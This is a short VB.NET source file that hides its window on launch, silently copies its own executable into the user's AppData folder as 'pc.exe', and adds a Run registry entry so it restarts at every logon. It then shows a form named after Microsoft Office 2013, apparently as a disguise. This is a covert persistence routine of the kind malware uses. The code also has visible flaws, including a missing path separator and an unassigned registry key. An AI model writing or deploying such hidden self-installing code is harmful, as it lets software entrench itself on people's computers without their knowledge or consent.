Imports Microsoft.Win32

Public Class Form1
   Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        autoinicio()
        Me.Hide()
    End Sub
   
    Private Sub autoinicio()
        Dim dirPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        If My.Computer.FileSystem.FileExists(dirPath & "pc.exe") Then
            Microsoft_Office_2013.Timer1.Start()
        Else
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, dirPath & "pc.exe")
            Try
                Dim REGISTRADOR As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", True)
                If REGISTRADOR Is Nothing Then
                    Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                End If
                Dim NOMBRE As String = dirPath & "pc.exe"
                NOMBRE = NOMBRE.Remove(0, NOMBRE.LastIndexOf("\") + 1)
                REGISTRADOR.SetValue(NOMBRE, dirPath & "pc.exe", RegistryValueKind.String)
                Microsoft_Office_2013.Show()
            Catch ex As Exception
                Dim Result As DialogResult = MessageBox.Show(ex.Message, "Error as ocurrent", MessageBoxButtons.OK, MessageBoxIcon.Error)
                If Result = DialogResult.OK Then
                    End
                End If
            End Try
        End If
     End Sub
End Class
